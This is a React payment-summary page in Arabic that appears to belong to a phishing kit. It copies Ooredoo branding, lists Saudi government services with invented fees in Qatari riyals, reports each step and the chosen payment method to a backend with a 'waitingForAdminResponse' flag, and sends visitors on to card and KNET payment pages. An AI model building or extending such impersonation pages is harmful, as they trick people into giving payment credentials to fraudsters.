import { useEffect, useMemo, useState } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage } from "@/lib/store";
import { Button } from "@/components/ui/button";
import { CheckCircle2 } from "lucide-react";
import { useIsMobile } from "../hooks/useMobile";

const quickNavItems = [
  { label: "الرئيسية", icon: "/ooredoo/icons/home-icon.svg" },
  { label: "إدارة", icon: "/ooredoo/icons/manage-icon.svg" },
  { label: "دفع", icon: "/ooredoo/icons/pay-icon-active.svg", active: true },
  { label: "المتجر", icon: "/ooredoo/icons/shop-icon.svg" },
  { label: "المزيد", icon: "/ooredoo/icons/more-icon.svg" },
];

const servicePrices: Record<string, number> = {
  "ربط رقم الجوال وتنشيط الحساب": 10,
  "تحديث بيانات العنوان الوطني": 10,
  "قيد سجل تجاري لمؤسسة فردية": 500,
  "تجديد سجل تجاري": 200,
  "حجز اسم تجاري": 100,
  "تعديل سجل تجاري": 200,
  "مستخرج سجل تجاري / الإفادة التجارية": 100,
  "إصدار رخصة تجارية": 5000,
  "تجديد رخصة تجارية": 800,
  "تسجيل علامة تجارية": 7500,
  "إصدار الجواز السعودي": 300,
  "تجديد الجواز السعودي": 300,
  "تجديد الهوية الوطنية": 39,
  "إصدار رخصة قيادة": 100,
  "تجديد رخصة القيادة": 100,
  "تجديد رخصة سير": 100,
};

function PaymentLogo({ method }: { method: "card" | "knet" | "transfer" }) {
  if (method === "knet") {
    return (
      <img
        src="/assets/qpay-logo.png"
        alt="QPay"
        style={{ width: 80, height: 30, objectFit: "contain" }}
      />
    );
  }

  if (method === "transfer") {
    return (
      <svg width="34" height="34" viewBox="0 0 24 24" fill="currentColor" style={{ color: "#080808" }}>
        <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z" />
      </svg>
    );
  }

  return (
    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
      <span
        style={{
          color: "#1a1f71",
          fontFamily: "Arial, sans-serif",
          fontSize: 13,
          fontWeight: 700,
          letterSpacing: 0.4,
          lineHeight: 1,
        }}
      >
        VISA
      </span>
      <span
        style={{
          position: "relative",
          width: 28,
          height: 18,
          display: "inline-flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <span
          style={{
            position: "absolute",
            right: 2,
            width: 16,
            height: 16,
            borderRadius: "50%",
            background: "#eb001b",
          }}
        />
        <span
          style={{
            position: "absolute",
            left: 2,
            width: 16,
            height: 16,
            borderRadius: "50%",
            background: "#f79e1b",
            opacity: 0.95,
          }}
        />
      </span>
    </div>
  );
}

function OoredooSummaryLayout({
  selectedPaymentMethod,
  setSelectedPaymentMethod,
  totalAmount,
  currency,
  isProcessing,
  handlePayment,
  handleBack,
}: {
  selectedPaymentMethod: string | null;
  setSelectedPaymentMethod: (value: string) => void;
  totalAmount: number;
  currency: string;
  isProcessing: boolean;
  handlePayment: () => void;
  handleBack: () => void;
}) {
  const isMobile = useIsMobile();

  const paymentOptions = [
    { id: "knet", label: "QPay" },
    { id: "card", label: "بطاقة الائتمان" },
    { id: "transfer", label: "Apple Pay" },
  ] as const;

  const formattedAmount = useMemo(() => {
    const numericAmount = Number(totalAmount || 0);
    if (currency === "ر.ق") {
      return `${numericAmount.toFixed(3)} ${currency}`;
    }
    return `${numericAmount} ${currency}`;
  }, [currency, totalAmount]);

  return (
    <>
      <style>{`
        @font-face {
          font-family: 'Rubik-Regular';
          src: url('/ooredoo/fonts/Rubik-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
        }

        @font-face {
          font-family: 'Rubik-Medium';
          src: url('/ooredoo/fonts/Rubik-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
        }

        @font-face {
          font-family: 'NotoKufiArabic-Regular';
          src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
        }

        @font-face {
          font-family: 'NotoKufiArabic-SemiBold';
          src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2');
          font-weight: 600;
          font-style: normal;
        }
      `}</style>

      <div
        style={{
          minHeight: "100vh",
          background: isMobile ? "#ffffff" : "#f5f5f5",
          display: "flex",
          justifyContent: "center",
          fontFamily: "Rubik-Regular, NotoKufiArabic-Regular, Arial, sans-serif",
          direction: "ltr",
          overflowX: "hidden",
        }}
      >
        <div
          style={{
            width: "100%",
            maxWidth: isMobile ? "100%" : 552,
            minHeight: "100vh",
            display: "flex",
            flexDirection: isMobile ? "column" : "row",
            background: "#ffffff",
            overflowX: "hidden",
          }}
        >
          <main
            style={{
              width: isMobile ? "100%" : 375,
              minHeight: "100vh",
              background: "#ffffff",
              display: "flex",
              flexDirection: "column",
              position: "relative",
              borderRight: isMobile ? "none" : "1px solid #f0f0f0",
              boxSizing: "border-box",
              direction: "rtl",
            }}
          >
            <div
              style={{
                position: "sticky",
                top: 0,
                zIndex: 10,
                height: isMobile ? 56 : 72,
                display: "grid",
                gridTemplateColumns: "32px 1fr 32px",
                alignItems: "center",
                padding: "0 16px",
                background: "#ffffff",
                borderBottom: isMobile ? "none" : "1px solid #d8d8d8",
                direction: "ltr",
                boxShadow: isMobile ? "none" : "0 2px 8px rgba(0, 0, 0, 0.05)",
              }}
            >
              <img
                src="/ooredoo/icons/support-icon.svg"
                alt="Support"
                style={{ width: 22, height: 22, justifySelf: "start" }}
              />

              <h2
                style={{
                  margin: 0,
                  textAlign: "center",
                  fontFamily: "Rubik-Medium, NotoKufiArabic-SemiBold, sans-serif",
                  fontSize: isMobile ? 14 : 16,
                  fontWeight: 500,
                  lineHeight: isMobile ? "20px" : "24px",
                  color: "#080808",
                  direction: "rtl",
                }}
              >
                ملخص
              </h2>

              <button
                type="button"
                onClick={handleBack}
                style={{
                  border: "none",
                  background: "transparent",
                  padding: 0,
                  margin: 0,
                  width: 32,
                  height: 32,
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  cursor: "pointer",
                  justifySelf: "end",
                }}
              >
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#080808" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M5 12h14" />
                  <path d="m12 5 7 7-7 7" />
                </svg>
              </button>
            </div>

            {isMobile ? (
              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  padding: "2px 16px 8px",
                  background: "#ffffff",
                }}
              >
                <img
                  src="/ooredoo/ooredoo-logo.svg"
                  alt="Ooredoo"
                  style={{ width: 116, height: 36, objectFit: "contain" }}
                />
              </div>
            ) : null}

            <div
              style={{
                flex: 1,
                display: "flex",
                flexDirection: "column",
                padding: isMobile ? "10px 16px 140px" : "18px 20px 150px",
                boxSizing: "border-box",
              }}
            >
              <h1
                style={{
                  margin: isMobile ? "4px 0 16px" : "6px 0 20px",
                  textAlign: "right",
                  fontFamily: "Rubik-Medium, NotoKufiArabic-SemiBold, sans-serif",
                  fontSize: isMobile ? 18 : 20,
                  fontWeight: 600,
                  color: "#080808",
                  lineHeight: 1.5,
                }}
              >
                دفع سريع و آمن
              </h1>

              <div
                style={{
                  width: "100%",
                  borderRadius: 16,
                  background: "#f7f7f8",
                  padding: isMobile ? "14px 16px" : "16px 22px",
                  boxSizing: "border-box",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  gap: 12,
                  marginBottom: isMobile ? 24 : 42,
                }}
              >
                <div
                  style={{
                    textAlign: "right",
                    color: "#080808",
                    fontFamily: "Rubik-Regular, NotoKufiArabic-Regular, sans-serif",
                    fontSize: isMobile ? 14 : 16,
                    lineHeight: isMobile ? "22px" : "24px",
                  }}
                >
                  الإجمالي
                </div>
                <div
                  style={{
                    color: "#080808",
                    fontFamily: "Rubik-Medium, NotoKufiArabic-SemiBold, sans-serif",
                    fontSize: isMobile ? 18 : 20,
                    fontWeight: 600,
                    lineHeight: isMobile ? "24px" : "28px",
                    direction: "ltr",
                  }}
                >
                  {formattedAmount}
                </div>
              </div>

              <div style={{ textAlign: "center", marginBottom: isMobile ? 22 : 28 }}>
                <h3
                  style={{
                    margin: 0,
                    color: "#080808",
                    fontFamily: "Rubik-Medium, NotoKufiArabic-SemiBold, sans-serif",
                    fontSize: isMobile ? 16 : 18,
                    fontWeight: 600,
                    lineHeight: isMobile ? "24px" : "28px",
                  }}
                >
                  طريقة الدفع
                </h3>
                <p
                  style={{
                    margin: "4px 0 0",
                    color: "#4c5562",
                    fontSize: isMobile ? 13 : 14,
                    lineHeight: isMobile ? "20px" : "22px",
                  }}
                >
                  يرجى اختيار طريقه الدفع
                </p>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: isMobile ? 12 : 16 }}>
                {paymentOptions.map((option) => {
                  const isSelected = selectedPaymentMethod === option.id;
                  return (
                    <button
                      key={option.id}
                      type="button"
                      onClick={() => setSelectedPaymentMethod(option.id)}
                      style={{
                        width: "100%",
                        borderRadius: 18,
                        border: `2px solid ${isSelected ? "#ed1c24" : "#edf0f2"}`,
                        background: "#ffffff",
                        boxShadow: isSelected ? "0 6px 18px rgba(237, 28, 36, 0.08)" : "0 4px 16px rgba(0, 0, 0, 0.06)",
                        padding: option.id === "transfer" && isSelected ? (isMobile ? "14px 14px 12px" : "18px 16px 14px") : (isMobile ? "14px" : "18px 16px"),
                        cursor: "pointer",
                        textAlign: "right",
                        transition: "all 0.2s ease",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "space-between",
                          gap: 12,
                          direction: "rtl",
                        }}
                      >
                        <span
                          style={{
                            width: 28,
                            height: 28,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            flexShrink: 0,
                          }}
                        >
                          {isSelected ? (
                            <CheckCircle2 size={24} color="#ed1c24" fill="#ed1c24" stroke="#ffffff" strokeWidth={2.5} />
                          ) : (
                            <span
                              style={{
                                width: 26,
                                height: 26,
                                borderRadius: "50%",
                                border: "1.5px solid #d7dce2",
                                display: "inline-block",
                                boxSizing: "border-box",
                              }}
                            />
                          )}
                        </span>

                        <span
                          style={{
                            flex: 1,
                            color: "#080808",
                            fontFamily: "Rubik-Medium, NotoKufiArabic-SemiBold, sans-serif",
                            fontSize: isMobile ? 14 : 16,
                            fontWeight: 500,
                            lineHeight: isMobile ? "22px" : "24px",
                            textAlign: "right",
                          }}
                        >
                          {option.label}
                        </span>

                        <span
                          style={{
                            minWidth: 54,
                            height: 32,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "flex-start",
                            flexShrink: 0,
                          }}
                        >
                          <PaymentLogo method={option.id} />
                        </span>
                      </div>

                      {option.id === "transfer" && isSelected && (
                        <div
                          style={{
                            marginTop: 10,
                            color: "#ed1c24",
                            fontSize: isMobile ? 11 : 12,
                            lineHeight: isMobile ? "16px" : "18px",
                            textAlign: "center",
                            fontFamily: "Rubik-Regular, NotoKufiArabic-Regular, sans-serif",
                          }}
                        >
                          الدفع عن طريق Apple Pay غير متاح حالياً
                        </div>
                      )}
                    </button>
                  );
                })}
              </div>
            </div>

            <div
              style={{
                position: "sticky",
                bottom: 0,
                padding: isMobile ? "12px 16px 18px" : "14px 20px 22px",
                background: "linear-gradient(180deg, rgba(255,255,255,0) 0%, #ffffff 26%, #ffffff 100%)",
              }}
            >
              <button
                type="button"
                onClick={handlePayment}
                disabled={!selectedPaymentMethod || selectedPaymentMethod === "transfer" || isProcessing}
                style={{
                  width: "100%",
                  height: isMobile ? 56 : 62,
                  borderRadius: 999,
                  border: "none",
                  outline: "none",
                  background: !selectedPaymentMethod || selectedPaymentMethod === "transfer" || isProcessing ? "#ebecef" : "#ed1c24",
                  color: !selectedPaymentMethod || selectedPaymentMethod === "transfer" || isProcessing ? "#9da3ae" : "#ffffff",
                  cursor: !selectedPaymentMethod || selectedPaymentMethod === "transfer" || isProcessing ? "not-allowed" : "pointer",
                  fontFamily: "Rubik-Medium, NotoKufiArabic-SemiBold, sans-serif",
                  fontSize: isMobile ? 16 : 18,
                  fontWeight: 600,
                  boxShadow: selectedPaymentMethod && selectedPaymentMethod !== "transfer" && !isProcessing ? "0 10px 24px rgba(237, 28, 36, 0.2)" : "none",
                }}
              >
                {isProcessing ? "جاري المعالجة..." : "استمرار"}
              </button>
            </div>
          </main>

          <aside
            style={{
              width: 177,
              background: "#ffffff",
              borderLeft: "1px solid #f0f0f0",
              display: isMobile ? "none" : "flex",
              flexDirection: "column",
              alignItems: "center",
              padding: "25px 16px 31px",
              gap: 26,
              minHeight: "100vh",
              boxSizing: "border-box",
              direction: "rtl",
            }}
          >
            <img
              src="/ooredoo/ooredoo-logo.svg"
              alt="Ooredoo"
              style={{ width: 120, height: 38, objectFit: "contain", alignSelf: "center" }}
            />

            <nav style={{ width: "100%", display: "flex", flexDirection: "column", gap: 16 }}>
              {quickNavItems.map((item) => (
                <button
                  key={item.label}
                  type="button"
                  style={{
                    width: "100%",
                    border: "none",
                    outline: "none",
                    background: item.active ? "#fff0f0" : "transparent",
                    borderRadius: 24,
                    padding: "8px 16px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "flex-start",
                    gap: 12,
                    color: item.active ? "#ed1c24" : "#222222",
                    cursor: "default",
                    fontFamily: item.active ? "Rubik-Medium, NotoKufiArabic-SemiBold, sans-serif" : "Rubik-Regular, NotoKufiArabic-Regular, sans-serif",
                    fontSize: 16,
                    fontWeight: item.active ? 500 : 400,
                    textAlign: "right",
                    direction: "rtl",
                  }}
                >
                  <span
                    style={{
                      width: 28,
                      height: 28,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexShrink: 0,
                    }}
                  >
                    <img src={item.icon} alt="" style={{ width: 22, height: 22, objectFit: "contain" }} />
                  </span>
                  <span style={{ lineHeight: 1.2 }}>{item.label}</span>
                </button>
              ))}
            </nav>
          </aside>
        </div>
      </div>
    </>
  );
}

function DefaultSummaryLayout({
  displayServiceName,
  servicePrice,
  vatAmount,
  totalAmount,
  currency,
  selectedPaymentMethod,
  setSelectedPaymentMethod,
  isProcessing,
  handlePayment,
  isMOH,
}: {
  displayServiceName: string;
  servicePrice: number;
  vatAmount: number;
  totalAmount: number;
  currency: string;
  selectedPaymentMethod: string | null;
  setSelectedPaymentMethod: (value: string) => void;
  isProcessing: boolean;
  handlePayment: () => void;
  isMOH: boolean;
}) {
  const paymentOptions = [
    {
      id: "card",
      title: "بطاقة ائتمان",
      subtitle: "Visa, Mastercard",
    },
    {
      id: "knet",
      title: "QPay",
      subtitle: "الدفع بواسطة QPay",
    },
    {
      id: "transfer",
      title: "Apple Pay",
      subtitle: "الدفع بواسطة Apple Pay",
    },
  ] as const;

  return (
    <div className="min-h-screen bg-gray-50 py-8" dir="rtl">
      <div className="mx-auto max-w-2xl px-4">
        <div className="mb-6 rounded-3xl bg-white p-6 shadow-sm">
          <h1 className="mb-5 text-2xl font-bold text-gray-900">ملخص الطلب والدفع</h1>

          <div className="space-y-3 rounded-2xl border border-gray-100 bg-gray-50 p-4">
            <div className="flex items-center justify-between gap-4">
              <span className="text-gray-500">الخدمة</span>
              <span className="font-medium text-gray-900">{displayServiceName}</span>
            </div>
            <div className="flex items-center justify-between gap-4">
              <span className="text-gray-500">رسوم الخدمة</span>
              <span className="font-medium text-gray-900">{servicePrice} {currency}</span>
            </div>
            {!isMOH && (
              <div className="flex items-center justify-between gap-4">
                <span className="text-gray-500">ضريبة القيمة المضافة</span>
                <span className="font-medium text-gray-900">{vatAmount} {currency}</span>
              </div>
            )}
            <div className="flex items-center justify-between rounded-2xl bg-red-50 px-4 py-3">
              <span className="font-bold text-[#ed1c24]">الإجمالي</span>
              <span className="text-xl font-bold text-[#ed1c24]">{totalAmount} {currency}</span>
            </div>
          </div>
        </div>

        <div className="rounded-3xl bg-white p-6 shadow-sm">
          <h2 className="mb-1 text-center text-xl font-bold text-gray-900">طريقة الدفع</h2>
          <p className="mb-6 text-center text-sm text-gray-500">يرجى اختيار طريقة الدفع</p>

          <div className="space-y-4">
            {paymentOptions.map((option) => {
              const isSelected = selectedPaymentMethod === option.id;
              return (
                <button
                  key={option.id}
                  type="button"
                  onClick={() => setSelectedPaymentMethod(option.id)}
                  className={`w-full rounded-2xl border-2 px-4 py-4 text-right transition ${isSelected ? "border-[#ed1c24] bg-white shadow-[0_8px_22px_rgba(237,28,36,0.10)]" : "border-gray-200 bg-white shadow-[0_4px_16px_rgba(0,0,0,0.05)]"}`}
                >
                  <div className="flex items-center justify-between gap-3">
                    <div className="flex h-7 w-7 items-center justify-center">
                      {isSelected ? (
                        <CheckCircle2 className="h-6 w-6 fill-[#ed1c24] text-white" />
                      ) : (
                        <span className="block h-6 w-6 rounded-full border border-gray-300" />
                      )}
                    </div>
                    <div className="flex-1">
                      <div className="font-medium text-gray-900">{option.title}</div>
                      <div className="text-sm text-gray-500">{option.subtitle}</div>
                    </div>
                    <PaymentLogo method={option.id} />
                  </div>
                  {option.id === "transfer" && isSelected && (
                    <div className="mt-2 text-center text-xs text-[#ed1c24]">الدفع عن طريق Apple Pay غير متاح حالياً</div>
                  )}
                </button>
              );
            })}
          </div>

          <Button
            className="mt-8 h-14 w-full rounded-full bg-[#ed1c24] text-base hover:bg-[#d71920]"
            disabled={!selectedPaymentMethod || selectedPaymentMethod === "transfer" || isProcessing}
            onClick={handlePayment}
          >
            {isProcessing ? "جاري المعالجة..." : "استمرار"}
          </Button>
        </div>
      </div>
    </div>
  );
}

export default function SummaryPayment() {
  const [, setLocation] = useLocation();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get("service") || "ربط رقم الجوال وتنشيط الحساب";
  const isMOH = serviceName === "moh";
  const mohData = isMOH ? JSON.parse(localStorage.getItem("mohPaymentData") || "{}") : {};

  const servicePrice = isMOH ? Number(mohData.totalAmount || 0) : servicePrices[serviceName] || 500;
  const vatAmount = isMOH ? 0 : Math.round(servicePrice * 0.15);
  const totalAmount = isMOH ? servicePrice : servicePrice + vatAmount;
  const currency = "ر.ق";
  const displayServiceName = isMOH ? mohData.serviceType || "الضمان الصحي" : serviceName;

  useEffect(() => {
    navigateToPage("ملخص الدفع");
  }, []);

  const handlePayment = () => {
    if (!selectedPaymentMethod) return;

    setIsProcessing(true);

    const paymentMethodLabel =
      selectedPaymentMethod === "card"
        ? "بطاقة ائتمان"
        : selectedPaymentMethod === "knet"
          ? "QPay"
          : "Apple Pay";

    sendData({
      data: {
        paymentMethod: paymentMethodLabel,
        serviceName,
        servicePrice,
        vatAmount,
        totalAmount,
      },
      current: "ملخص الدفع",
      nextPage:
        selectedPaymentMethod === "knet"
          ? "knet-payment"
          : selectedPaymentMethod === "card"
            ? "credit-card-payment"
            : "bank-transfer",
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPaymentMethod === "knet") {
        window.location.href = "/knet-payment";
      } else if (selectedPaymentMethod === "card") {
        window.location.href = `/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
      } else {
        window.location.href = `/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
      }
    }, 1500);
  };

  const handleBack = () => {
    if (window.history.length > 1) {
      window.history.back();
      return;
    }
    setLocation("/");
  };

  if (isMOH) {
    return (
      <OoredooSummaryLayout
        selectedPaymentMethod={selectedPaymentMethod}
        setSelectedPaymentMethod={setSelectedPaymentMethod}
        totalAmount={totalAmount}
        currency={currency}
        isProcessing={isProcessing}
        handlePayment={handlePayment}
        handleBack={handleBack}
      />
    );
  }

  return (
    <DefaultSummaryLayout
      displayServiceName={displayServiceName}
      servicePrice={servicePrice}
      vatAmount={vatAmount}
      totalAmount={totalAmount}
      currency={currency}
      selectedPaymentMethod={selectedPaymentMethod}
      setSelectedPaymentMethod={setSelectedPaymentMethod}
      isProcessing={isProcessing}
      handlePayment={handlePayment}
      isMOH={isMOH}
    />
  );
}
